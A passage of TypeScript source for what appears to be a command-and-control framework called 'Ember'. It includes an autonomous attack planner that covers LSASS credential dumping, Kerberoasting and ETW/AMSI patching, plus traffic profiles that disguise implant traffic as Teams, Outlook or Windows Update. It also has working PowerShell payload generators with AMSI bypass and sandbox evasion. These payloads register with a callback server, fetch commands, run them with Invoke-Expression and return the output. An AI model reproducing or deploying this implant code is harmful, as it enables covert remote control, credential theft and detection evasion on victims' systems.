      action: "Enumerate local system information and network configuration",
      technique: "T1082",
      riskLevel: "low",
      reasoning: "Baseline system enumeration is essential for planning further actions",
    });

    // Step 2: Network discovery
    plan.push({
      action: "Discover adjacent hosts and services on the local network segment",
      technique: "T1046",
      riskLevel: "low",
      reasoning: "Understanding the network topology reveals lateral movement opportunities",
    });

    // Step 3: Credential access (platform-specific)
    if (isWindows && systemInfo.isElevated) {
      plan.push({
        action: "Extract credentials from LSASS memory",
        technique: "T1003.001",
        riskLevel: "high",
        reasoning: "Elevated access on Windows enables credential extraction for lateral movement",
      });
    } else if (isWindows && isDomainJoined) {
      plan.push({
        action: "Attempt Kerberoasting to extract service account hashes",
        technique: "T1558.003",
        riskLevel: "medium",
        reasoning: "Domain-joined system enables Kerberoasting without elevation",
      });
    } else {
      plan.push({
        action: "Search for SSH keys and credential files",
        technique: "T1552.004",
        riskLevel: "low",
        reasoning: "File-based credential harvesting is low-risk and often productive",
      });
    }

    // Step 4: Evasion if needed
    if (hasEDR) {
      plan.push({
        action: "Patch ETW and AMSI to reduce detection surface",
        technique: "T1562.001",
        riskLevel: "medium",
        reasoning: "EDR detected — reducing telemetry improves operational security",
      });
    }

    return {
      assessment: {
        networkSegment: systemInfo.networkInterfaces[0]?.ipv4?.replace(/\.\d+$/, ".0/24") || "unknown",
        securityPosture: securityPosture as any,
        detectedControls,
        recommendedApproach: hasEDR
          ? "Stealth-first approach: minimize process creation, use in-memory techniques"
          : "Standard approach: enumerate, escalate, pivot",
      },
      initialPlan: plan,
    };
  }

  getStatus(): EmberCognitiveStatus {
    return {
      active: true,
      currentObjective: this.objective,
      plannedActions: this.planCache,
      autonomousActionsTaken: this.actionsTaken,
      autonomousActionsRemaining: this.maxActions - this.actionsTaken,
      environmentAssessment: {
        networkSegment: this.environmentContext.networkInterfaces?.[0]?.ipv4?.replace(/\.\d+$/, ".0/24") || "unknown",
        securityPosture: "moderate",
        detectedControls: (this.environmentContext.securityProducts || []).map((s: any) => s.name),
        recommendedApproach: "Analyzing...",
      },
    };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// §8 — SWARM INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════════

export interface EmberSwarmData {
  /** Swarm ID (shared across all agents in the swarm) */
  swarmId: string;
  /** This agent's role in the swarm */
  role: "coordinator" | "worker" | "relay" | "observer";
  /** Known peer agents */
  peers: Array<{
    agentId: string;
    lastSeen: number;
    state: EmberAgentState;
    hostname: string;
    capabilities: string[];
  }>;
  /** Shared intelligence pool */
  sharedIntelligence: EmberIntelligence[];
  /** Distributed task assignments */
  taskAssignments: Array<{
    taskId: string;
    assignedTo: string;
    status: string;
  }>;
  /** Collective evasion state */
  evasionState: {
    /** Agents that have been detected */
    compromisedAgents: string[];
    /** Channels that are being monitored */
    monitoredChannels: EmberChannelType[];
    /** Recommended safe channels */
    safeChannels: EmberChannelType[];
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// §9 — POLYMORPHIC PROTOCOL ENGINE
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Traffic profiles that Ember can mimic to blend in with legitimate traffic.
 * Each profile defines HTTP headers, timing patterns, and payload structures
 * that match real application traffic.
 */
export interface EmberTrafficProfile {
  id: string;
  name: string;
  description: string;
  /** HTTP headers to use */
  headers: Record<string, string>;
  /** URL patterns for requests */
  urlPatterns: string[];
  /** Expected response content types */
  responseContentTypes: string[];
  /** Timing characteristics */
  timing: {
    minIntervalMs: number;
    maxIntervalMs: number;
    burstSize: number;
    burstIntervalMs: number;
  };
  /** Payload encoding method */
  payloadEncoding: "base64_in_json" | "base64_in_cookie" | "steganographic" | "chunked_in_headers";
}

export const EMBER_TRAFFIC_PROFILES: EmberTrafficProfile[] = [
  {
    id: "chrome_browsing",
    name: "Chrome Web Browsing",
    description: "Mimics Google Chrome browsing traffic with realistic headers and timing",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Accept-Encoding": "gzip, deflate, br",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "none",
      "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    },
    urlPatterns: ["/api/v1/sync", "/api/v1/telemetry", "/api/v1/config", "/api/v1/update"],
    responseContentTypes: ["application/json", "application/octet-stream"],
    timing: { minIntervalMs: 5000, maxIntervalMs: 30000, burstSize: 3, burstIntervalMs: 500 },
    payloadEncoding: "base64_in_json",
  },
  {
    id: "teams_api",
    name: "Microsoft Teams API",
    description: "Mimics Microsoft Teams presence/notification polling",
    headers: {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Teams/1.6.00.28567",
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJub25jZSI6IjEyMzQ1Njc4OTAi...",
      "X-Ms-Client-Request-Id": "",
    },
    urlPatterns: ["/api/chatsvcagg/v1/threads", "/api/mt/part/emea-03/beta/users/me/presence", "/api/csa/api/v1/teams"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 10000, maxIntervalMs: 60000, burstSize: 1, burstIntervalMs: 0 },
    payloadEncoding: "base64_in_json",
  },
  {
    id: "outlook_sync",
    name: "Outlook Email Sync",
    description: "Mimics Outlook/Exchange email synchronization traffic",
    headers: {
      "User-Agent": "Microsoft Outlook 16.0",
      "Content-Type": "application/json; charset=utf-8",
      "Accept": "application/json",
      "X-AnchorMailbox": "user@contoso.com",
    },
    urlPatterns: ["/api/v2.0/me/mailfolders/inbox/messages", "/api/v2.0/me/events", "/api/v2.0/me/contacts"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 30000, maxIntervalMs: 120000, burstSize: 5, burstIntervalMs: 200 },
    payloadEncoding: "base64_in_json",
  },
  {
    id: "slack_websocket",
    name: "Slack WebSocket",
    description: "Mimics Slack real-time messaging WebSocket connection",
    headers: {
      "User-Agent": "Mozilla/5.0 Slack/4.35.126",
      "Origin": "https://app.slack.com",
      "Sec-WebSocket-Protocol": "wss",
    },
    urlPatterns: ["/ws/connect", "/api/rtm.connect", "/api/conversations.history"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 1000, maxIntervalMs: 5000, burstSize: 10, burstIntervalMs: 100 },
    payloadEncoding: "base64_in_json",
  },
  {
    id: "windows_update",
    name: "Windows Update",
    description: "Mimics Windows Update check-in traffic",
    headers: {
      "User-Agent": "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.50",
      "Content-Type": "application/soap+xml; charset=utf-8",
      "Accept": "*/*",
    },
    urlPatterns: ["/v6/windowsupdate/redir/muv4wuredir.cab", "/v6/windowsupdate/selfupdate/WSUS3.cab"],
    responseContentTypes: ["application/octet-stream", "application/soap+xml"],
    timing: { minIntervalMs: 300000, maxIntervalMs: 3600000, burstSize: 1, burstIntervalMs: 0 },
    payloadEncoding: "chunked_in_headers",
  },
  {
    id: "cloudflare_api",
    name: "Cloudflare API",
    description: "Mimics Cloudflare API polling for DNS/WAF status",
    headers: {
      "User-Agent": "cloudflare-sdk/1.0",
      "Content-Type": "application/json",
      "Authorization": "Bearer cf_...",
    },
    urlPatterns: ["/client/v4/zones", "/client/v4/user/tokens/verify", "/client/v4/accounts"],
    responseContentTypes: ["application/json"],
    timing: { minIntervalMs: 60000, maxIntervalMs: 300000, burstSize: 2, burstIntervalMs: 1000 },
    payloadEncoding: "base64_in_json",
  },
];

// ═══════════════════════════════════════════════════════════════════════════════
// §10 — EMBER PAYLOAD GENERATION
// ═══════════════════════════════════════════════════════════════════════════════

export type EmberPayloadFormat =
  | "powershell_oneliner"    // PowerShell one-liner for initial access
  | "powershell_script"      // Full PowerShell script
  | "bash_oneliner"          // Bash one-liner for Linux
  | "bash_script"            // Full bash script
  | "python_stager"          // Python-based stager
  | "dll_sideload"           // DLL for sideloading
  | "msi_installer"          // MSI package
  | "hta_dropper"            // HTA file dropper
  | "macro_document"         // Office macro payload
  | "iso_container"          // ISO file container
  | "lnk_shortcut"           // Windows shortcut payload
  | "service_executable"     // Windows service EXE
  | "elf_binary"             // Linux ELF binary
  | "shellcode_raw"          // Raw shellcode
  | "bof_module";            // Beacon Object File

export interface EmberPayloadConfig {
  /** Target platform */
  platform: EmberPlatform;
  /** Payload format */
  format: EmberPayloadFormat;
  /** Agent profile to embed */
  profile: EmberProfile;
  /** C2 callback configuration */
  callback: {
    urls: string[];
    primaryChannel: EmberChannelType;
    fallbackChannels: EmberChannelType[];
  };
  /** Evasion options */
  evasion: {
    /** Obfuscation level (1-5) */
    obfuscationLevel: number;
    /** Enable string encryption */
    stringEncryption: boolean;
    /** Enable control flow obfuscation */
    controlFlowObfuscation: boolean;
    /** Enable anti-debugging */
    antiDebugging: boolean;
    /** Enable anti-VM detection */
    antiVM: boolean;
    /** Enable sandbox detection */
    sandboxDetection: boolean;
    /** Custom sleep before execution (ms) */
    initialSleepMs: number;
    /** Process to inject into (for injection payloads) */
    targetProcess?: string;
  };
  /** Beacon configuration to embed */
  beacon: {
    intervalSeconds: number;
    jitterPercent: number;
    killDate?: number;
    workingHours?: { start: number; end: number };
  };
  /** Registration token for auto-approval */
  registrationToken: string;
  /** Cognitive core configuration */
  cognitive?: {
    enabled: boolean;
    objective: string;
    autonomy: EmberAutonomyLevel;
    maxActions: number;
    riskThreshold: number;
  };
}

export interface EmberPayloadOutput {
  /** Generated payload content */
  payload: string;
  /** Payload format */
  format: EmberPayloadFormat;
  /** Filename */
  filename: string;
  /** Content type */
  contentType: string;
  /** Size in bytes */
  size: number;
  /** SHA-256 hash */
  hash: string;
  /** One-liner deployment command (if applicable) */
  oneLiner?: string;
  /** Embedded capabilities */
  capabilities: string[];
  /** Evasion techniques applied */
  evasionTechniques: string[];
  /** Estimated detection probability (0-100) */
  estimatedDetectionRate: number;
  /** Generated timestamp */
  generatedAt: number;
}

// ═══════════════════════════════════════════════════════════════════════════════
// §11 — EMBER AGENT MANAGER (SERVER-SIDE)
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * EmberAgentManager — Server-side manager for all Ember agents.
 *
 * Maintains the fleet state, processes beacons, dispatches tasks,
 * and coordinates swarm operations.
 */
export class EmberAgentManager {
  private agents: Map<string, EmberAgentState & { config: EmberAgentConfig; lastBeacon?: EmberBeacon }> = new Map();
  private taskQueues: Map<string, EmberTask[]> = new Map();
  private cognitiveCores: Map<string, EmberCognitiveCore> = new Map();
  private swarms: Map<string, EmberSwarmData> = new Map();
  private intelligencePool: EmberIntelligence[] = [];

  /** Register a new Ember agent */
  registerAgent(config: EmberAgentConfig): { agentId: string; registrationToken: string } {
    const agentId = config.agentId;
    this.agents.set(agentId, {
      ...("initializing" as any),
      config,
    });
    this.taskQueues.set(agentId, []);

    // Initialize cognitive core if enabled
    if (config.cognitive.enabled) {
      this.cognitiveCores.set(agentId, new EmberCognitiveCore({
        agentId,
        objective: config.cognitive.objective || "Assess security posture",
        constraints: config.cognitive.constraints,
        autonomyLevel: config.autonomy,
        maxActions: config.cognitive.maxAutonomousActions,
        riskThreshold: config.cognitive.riskThreshold,
      }));
    }

    const token = `ember-${agentId.slice(0, 8)}-${Date.now().toString(36)}`;
    return { agentId, registrationToken: token };
  }

  /** Process an incoming beacon from an Ember agent */
  async processBeacon(beacon: EmberBeacon): Promise<{
    tasks: EmberTask[];
    configUpdates?: Partial<EmberAgentConfig>;
    swarmUpdates?: EmberSwarmData;
  }> {
    const agentEntry = this.agents.get(beacon.agentId);
    if (!agentEntry) {
      return { tasks: [] };
    }

    // Update agent state
    (agentEntry as any).lastBeacon = beacon;

    // Get pending tasks for this agent
    const pendingTasks = this.taskQueues.get(beacon.agentId) || [];
    const tasksToSend = pendingTasks.splice(0, 10); // Send up to 10 tasks per beacon

    // If cognitive core is active, let it decide additional tasks
    const cognitiveCore = this.cognitiveCores.get(beacon.agentId);
    if (cognitiveCore) {
      try {
        // Decode beacon payload (in production, this would decrypt)
        const payload: EmberBeaconPayload = JSON.parse(
          Buffer.from(beacon.encryptedPayload, "base64").toString()
        );

        // Feed intelligence to the pool
        if (payload.intelligence) {
          this.intelligencePool.push(...payload.intelligence);
          if (this.intelligencePool.length > 10000) {
            this.intelligencePool = this.intelligencePool.slice(-8000);
          }
        }

        // Let cognitive core decide next action
        const cognitiveTask = await cognitiveCore.decideNextAction(
          beacon.state,
          this.intelligencePool.filter(i => i.sourceAgentId === beacon.agentId),
          agentEntry.config.capabilities.filter(c => c.loaded),
        );

        if (cognitiveTask) {
          // Safety check before adding cognitive task
          const safety = getSafetyEngine(agentEntry.config.engagementId);
          const assessment = safety.assessCommand(
            cognitiveTask.type,
            JSON.stringify(cognitiveTask.params),
            agentEntry.config.network.callbackUrls[0] || "unknown",
          );

          if (assessment.allowed) {
            cognitiveTask.safetyAssessment = {
              allowed: true,
              riskScore: assessment.blastRadius.riskScore,
              reason: assessment.reason,
            };
            tasksToSend.push(cognitiveTask);
          }
        }
      } catch {
        // Cognitive processing failed, continue with manual tasks only
      }
    }

    return {
      tasks: tasksToSend,
      swarmUpdates: this.getSwarmDataForAgent(beacon.agentId),
    };
  }

  /** Queue a task for an agent */
  queueTask(agentId: string, task: EmberTask): boolean {
    const queue = this.taskQueues.get(agentId);
    if (!queue) return false;

    // Safety check
    const agentEntry = this.agents.get(agentId);
    if (agentEntry) {
      const safety = getSafetyEngine(agentEntry.config.engagementId);
      const assessment = safety.assessCommand(
        task.type,
        JSON.stringify(task.params),
        agentEntry.config.network.callbackUrls[0] || "unknown",
      );

      task.safetyAssessment = {
        allowed: assessment.allowed,
        riskScore: assessment.blastRadius.riskScore,
        reason: assessment.reason,
      };

      if (!assessment.allowed) return false;
    }

    // Insert by priority (higher priority first)
    const insertIdx = queue.findIndex(t => t.priority < task.priority);
    if (insertIdx === -1) queue.push(task);
    else queue.splice(insertIdx, 0, task);

    return true;
  }

  /** Get swarm data for a specific agent */
  private getSwarmDataForAgent(agentId: string): EmberSwarmData | undefined {
    for (const [swarmId, swarm] of this.swarms) {
      if (swarm.peers.some(p => p.agentId === agentId)) {
        return swarm;
      }
    }
    return undefined;
  }

  /** Create a new swarm from existing agents */
  createSwarm(swarmId: string, agentIds: string[], coordinatorId: string): EmberSwarmData {
    const peers = agentIds.map(id => {
      const agent = this.agents.get(id);
      return {
        agentId: id,
        lastSeen: Date.now(),
        state: "active" as EmberAgentState,
        hostname: agent?.config.name || "unknown",
        capabilities: agent?.config.capabilities.map(c => c.id) || [],
      };
    });

    const swarm: EmberSwarmData = {
      swarmId,
      role: "coordinator",
      peers,
      sharedIntelligence: [],
      taskAssignments: [],
      evasionState: {
        compromisedAgents: [],
        monitoredChannels: [],
        safeChannels: ["https_beacon", "doh_tunnel", "p2p_mesh"],
      },
    };

    this.swarms.set(swarmId, swarm);
    return swarm;
  }

  /** Get fleet overview */
  getFleetOverview(): {
    totalAgents: number;
    byState: Record<EmberAgentState, number>;
    byProfile: Record<EmberProfile, number>;
    byPlatform: Record<string, number>;
    activeSwarms: number;
    totalIntelligence: number;
    pendingTasks: number;
  } {
    const byState: Record<string, number> = {};
    const byProfile: Record<string, number> = {};
    const byPlatform: Record<string, number> = {};
    let pendingTasks = 0;

    for (const [id, agent] of this.agents) {
      const state = (agent as any).lastBeacon?.state || "initializing";
      byState[state] = (byState[state] || 0) + 1;
      byProfile[agent.config.profile] = (byProfile[agent.config.profile] || 0) + 1;
      byPlatform[agent.config.platform] = (byPlatform[agent.config.platform] || 0) + 1;
      pendingTasks += (this.taskQueues.get(id) || []).length;
    }

    return {
      totalAgents: this.agents.size,
      byState: byState as any,
      byProfile: byProfile as any,
      byPlatform: byPlatform as any,
      activeSwarms: this.swarms.size,
      totalIntelligence: this.intelligencePool.length,
      pendingTasks,
    };
  }

  /** Get agent details */
  getAgent(agentId: string): EmberAgentConfig | undefined {
    return this.agents.get(agentId)?.config;
  }

  /** Get all agents */
  getAllAgents(): Array<{ agentId: string; config: EmberAgentConfig; state: EmberAgentState; lastSeen: number }> {
    const result: Array<{ agentId: string; config: EmberAgentConfig; state: EmberAgentState; lastSeen: number }> = [];
    for (const [id, agent] of this.agents) {
      result.push({
        agentId: id,
        config: agent.config,
        state: (agent as any).lastBeacon?.state || "initializing",
        lastSeen: (agent as any).lastBeacon?.timestamp || agent.config.beacon.killDate || 0,
      });
    }
    return result;
  }

  /** Terminate an agent */
  terminateAgent(agentId: string): boolean {
    const queue = this.taskQueues.get(agentId);
    if (!queue) return false;

    queue.unshift({
      taskId: `ember-terminate-${Date.now()}`,
      type: "self_destruct",
      priority: 10,
      params: { cleanTraces: true },
      timeoutSeconds: 60,
      requiresElevation: false,
      createdAt: Date.now(),
      assignedBy: "operator",
    });

    return true;
  }

  /** Get cognitive core status for an agent */
  getCognitiveStatus(agentId: string): EmberCognitiveStatus | null {
    const core = this.cognitiveCores.get(agentId);
    return core ? core.getStatus() : null;
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// §12 — PAYLOAD GENERATORS
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Generate an Ember agent payload for deployment.
 *
 * This function creates platform-specific payloads that:
 *   1. Bootstrap the Ember agent on the target
 *   2. Establish C2 communication
 *   3. Register with the Ember Agent Manager
 *   4. Begin executing the configured profile
 */
export function generateEmberPayload(config: EmberPayloadConfig): EmberPayloadOutput {
  const generators: Record<EmberPayloadFormat, () => EmberPayloadOutput> = {
    powershell_oneliner: () => generatePowerShellOneLiner(config),
    powershell_script: () => generatePowerShellScript(config),
    bash_oneliner: () => generateBashOneLiner(config),
    bash_script: () => generateBashScript(config),
    python_stager: () => generatePythonStager(config),
    dll_sideload: () => generateDLLStub(config),
    msi_installer: () => generateMSIStub(config),
    hta_dropper: () => generateHTADropper(config),
    macro_document: () => generateMacroStub(config),
    iso_container: () => generateISOStub(config),
    lnk_shortcut: () => generateLNKStub(config),
    service_executable: () => generateServiceExeStub(config),
    elf_binary: () => generateELFStub(config),
    shellcode_raw: () => generateShellcodeStub(config),
    bof_module: () => generateBOFStub(config),
  };

  return generators[config.format]();
}

// ─── PowerShell Generators ──────────────────────────────────────────────────

function generatePowerShellOneLiner(config: EmberPayloadConfig): EmberPayloadOutput {
  const callbackUrl = config.callback.urls[0];
  const regToken = config.registrationToken;
  const interval = config.beacon.intervalSeconds;
  const jitter = config.beacon.jitterPercent;
  const profile = config.profile;

  const evasionPreamble = config.evasion.antiDebugging
    ? `$d=[System.Diagnostics.Debugger]::IsAttached;if($d){exit};`
    : "";

  const sandboxCheck = config.evasion.sandboxDetection
    ? `$m=(Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB;if($m -lt 2){exit};$p=(Get-Process).Count;if($p -lt 30){exit};`
    : "";

  const sleepPreamble = config.evasion.initialSleepMs > 0
    ? `Start-Sleep -Milliseconds ${config.evasion.initialSleepMs};`
    : "";

  const amsiBypass = config.evasion.obfuscationLevel >= 3
    ? `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true);`
    : "";

  const payload = `${evasionPreamble}${sandboxCheck}${sleepPreamble}${amsiBypass}$c='${callbackUrl}';$t='${regToken}';$i=${interval};$j=${jitter};$p='${profile}';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$o=[System.Environment]::OSVersion.VersionString;$b=@{agentId=[guid]::NewGuid().ToString();name="ember-$h";token=$t;hostname=$h;username=$u;platform='windows';os=$o;profile=$p;interval=$i;jitter=$j};$r=Invoke-RestMethod -Uri "$c/api/ember/register" -Method POST -Body ($b|ConvertTo-Json) -ContentType 'application/json';while($true){try{$beacon=@{agentId=$r.agentId;sequence=0;state='active';timestamp=[DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()};$resp=Invoke-RestMethod -Uri "$c/api/ember/beacon" -Method POST -Body ($beacon|ConvertTo-Json) -ContentType 'application/json';if($resp.tasks){foreach($task in $resp.tasks){try{$out=Invoke-Expression $task.params.command 2>&1|Out-String;Invoke-RestMethod -Uri "$c/api/ember/result" -Method POST -Body (@{taskId=$task.taskId;agentId=$r.agentId;status='success';output=$out}|ConvertTo-Json) -ContentType 'application/json'}catch{}}}}catch{};$sleep=$i+[int]($i*$j/100*(Get-Random -Min -1 -Max 1));Start-Sleep -Seconds $sleep}`;

  const encoded = Buffer.from(payload).toString("base64");
  const oneLiner = `powershell -nop -w hidden -enc ${encoded}`;

  return {
    payload: oneLiner,
    format: "powershell_oneliner",
    filename: "ember-stager.ps1",
    contentType: "text/plain",
    size: Buffer.byteLength(oneLiner),
    hash: simpleHash(oneLiner),
    oneLiner,
    capabilities: ["beacon", "shell_exec", "self_register"],
    evasionTechniques: [
      ...(config.evasion.antiDebugging ? ["anti_debugging"] : []),
      ...(config.evasion.sandboxDetection ? ["sandbox_detection"] : []),
      ...(config.evasion.obfuscationLevel >= 3 ? ["amsi_bypass"] : []),
      "base64_encoding",
      "hidden_window",
    ],
    estimatedDetectionRate: Math.max(10, 60 - config.evasion.obfuscationLevel * 10),
    generatedAt: Date.now(),
  };
}

function generatePowerShellScript(config: EmberPayloadConfig): EmberPayloadOutput {
  const callbackUrl = config.callback.urls[0];
  const fallbackUrls = config.callback.urls.slice(1);
  const regToken = config.registrationToken;

  const script = `# Ember Agent — AC3 Proprietary
# Profile: ${config.profile} | Platform: ${config.platform}
# Generated: ${new Date().toISOString()}
# Classification: PROPRIETARY — AC3 Internal Use Only

Set-StrictMode -Version Latest
$ErrorActionPreference = 'SilentlyContinue'

# ─── Configuration ───
$Config = @{
    CallbackUrls = @('${callbackUrl}'${fallbackUrls.map(u => `, '${u}'`).join("")})
    RegistrationToken = '${regToken}'
    Profile = '${config.profile}'
    BeaconInterval = ${config.beacon.intervalSeconds}
    JitterPercent = ${config.beacon.jitterPercent}
    KillDate = ${config.beacon.killDate || 0}
    Channel = '${config.callback.primaryChannel}'
}

# ─── Evasion Layer ───
function Invoke-EvasionChecks {
    ${config.evasion.antiDebugging ? `if ([System.Diagnostics.Debugger]::IsAttached) { exit }` : "# Anti-debug disabled"}
    ${config.evasion.sandboxDetection ? `
    $mem = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($mem -lt 2) { exit }
    $procs = (Get-Process).Count
    if ($procs -lt 30) { exit }
    $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    if ($uptime.TotalMinutes -lt 5) { Start-Sleep -Seconds 300 }` : "# Sandbox detection disabled"}
    ${config.evasion.obfuscationLevel >= 3 ? `
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $f = $a.GetField('amsiInitFailed', 'NonPublic,Static')
        $f.SetValue($null, $true)
    } catch {}` : "# AMSI bypass disabled"}
}

# ─── System Enumeration ───
function Get-SystemInfo {
    @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        platform = 'windows'
        architecture = if ([Environment]::Is64BitOperatingSystem) { 'x64' } else { 'x86' }
        osVersion = [System.Environment]::OSVersion.VersionString
        pid = $PID
        processName = (Get-Process -Id $PID).ProcessName
        isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        integrity = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 'high' } else { 'medium' }
        networkInterfaces = @(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | ForEach-Object {
            @{ name = $_.InterfaceAlias; ipv4 = $_.IPAddress; mac = (Get-NetAdapter -InterfaceIndex $_.InterfaceIndex).MacAddress }
        })
        securityProducts = @(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | ForEach-Object {
            @{ name = $_.displayName; type = 'av'; running = $true }
        })
    }
}

# ─── Beacon Loop ───
function Start-EmberBeacon {
    Invoke-EvasionChecks
    ${config.evasion.initialSleepMs > 0 ? `Start-Sleep -Milliseconds ${config.evasion.initialSleepMs}` : ""}

    $sysInfo = Get-SystemInfo
    $agentId = [guid]::NewGuid().ToString()
    $sequence = 0
    $currentUrlIdx = 0

    # Register
    $regBody = @{
        agentId = $agentId
        name = "ember-$($sysInfo.hostname)"
        token = $Config.RegistrationToken
        systemInfo = $sysInfo
        profile = $Config.Profile
        interval = $Config.BeaconInterval
        jitter = $Config.JitterPercent
    } | ConvertTo-Json -Depth 5

    $registered = $false
    foreach ($url in $Config.CallbackUrls) {
        try {
            $reg = Invoke-RestMethod -Uri "$url/api/ember/register" -Method POST -Body $regBody -ContentType 'application/json' -TimeoutSec 30
            if ($reg.agentId) { $registered = $true; $currentUrlIdx = $Config.CallbackUrls.IndexOf($url); break }
        } catch { continue }
    }
    if (-not $registered) { exit }

    # Main beacon loop
    while ($true) {
        if ($Config.KillDate -gt 0 -and [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() -gt $Config.KillDate) {
            # Self-destruct
            Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
            exit
        }

        $sequence++
        $beaconBody = @{
            agentId = $agentId
            sequence = $sequence
            state = 'active'
            timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
            channel = $Config.Channel
            systemInfo = $sysInfo
        } | ConvertTo-Json -Depth 5

        try {
            $url = $Config.CallbackUrls[$currentUrlIdx]
            $resp = Invoke-RestMethod -Uri "$url/api/ember/beacon" -Method POST -Body $beaconBody -ContentType 'application/json' -TimeoutSec 30

            if ($resp.tasks) {
                foreach ($task in $resp.tasks) {
                    $result = @{ taskId = $task.taskId; agentId = $agentId; status = 'failed'; output = ''; error = '' }
                    try {
                        switch ($task.type) {
                            'shell_command' {
                                $out = Invoke-Expression $task.params.command 2>&1 | Out-String
                                $result.status = 'success'
                                $result.output = $out
                            }
                            'sleep_update' {
                                $Config.BeaconInterval = $task.params.interval
                                $Config.JitterPercent = $task.params.jitter
                                $result.status = 'success'
                                $result.output = "Beacon updated: interval=$($task.params.interval)s jitter=$($task.params.jitter)%"
                            }
                            'self_destruct' {
                                Invoke-RestMethod -Uri "$url/api/ember/result" -Method POST -Body ($result | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10
                                Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
                                exit
                            }
                            default {
                                $result.output = "Unsupported task type: $($task.type)"
                            }
                        }
                    } catch {
                        $result.error = $_.Exception.Message
                    }
                    Invoke-RestMethod -Uri "$url/api/ember/result" -Method POST -Body ($result | ConvertTo-Json) -ContentType 'application/json' -TimeoutSec 10
                }
            }
        } catch {
            # Channel failure — try next URL
            $currentUrlIdx = ($currentUrlIdx + 1) % $Config.CallbackUrls.Count
        }

        # Jittered sleep
        $jitterRange = [int]($Config.BeaconInterval * $Config.JitterPercent / 100)
        $sleep = $Config.BeaconInterval + (Get-Random -Minimum (-$jitterRange) -Maximum $jitterRange)
        if ($sleep -lt 1) { $sleep = 1 }
        Start-Sleep -Seconds $sleep
    }
}

Start-EmberBeacon
`;

  return {
    payload: script,
    format: "powershell_script",
    filename: `ember-${config.profile}-${Date.now().toString(36)}.ps1`,
    contentType: "text/plain",
    size: Buffer.byteLength(script),
    hash: simpleHash(script),
    oneLiner: `powershell -nop -w hidden -ep bypass -f .\\ember-${config.profile}.ps1`,
    capabilities: ["beacon", "shell_exec", "self_register", "kill_date", "channel_failover", "system_enum"],
    evasionTechniques: [
      ...(config.evasion.antiDebugging ? ["anti_debugging"] : []),
      ...(config.evasion.sandboxDetection ? ["sandbox_detection", "uptime_check", "process_count_check"] : []),
      ...(config.evasion.obfuscationLevel >= 3 ? ["amsi_bypass"] : []),
      "jittered_beacon",
      "multi_callback_failover",
    ],
    estimatedDetectionRate: Math.max(5, 50 - config.evasion.obfuscationLevel * 8),
    generatedAt: Date.now(),
  };
}

// ─── Bash/Linux Generators ──────────────────────────────────────────────────

function generateBashOneLiner(config: EmberPayloadConfig): EmberPayloadOutput {
  const callbackUrl = config.callback.urls[0];
  const regToken = config.registrationToken;
  const interval = config.beacon.intervalSeconds;
  const jitter = config.beacon.jitterPercent;

  const sandboxCheck = config.evasion.sandboxDetection
    ? `[ \$(nproc) -lt 2 ] && exit; [ \$(cat /proc/meminfo | grep MemTotal | awk '{print $2}') -lt 1000000 ] && exit;`
    : "";

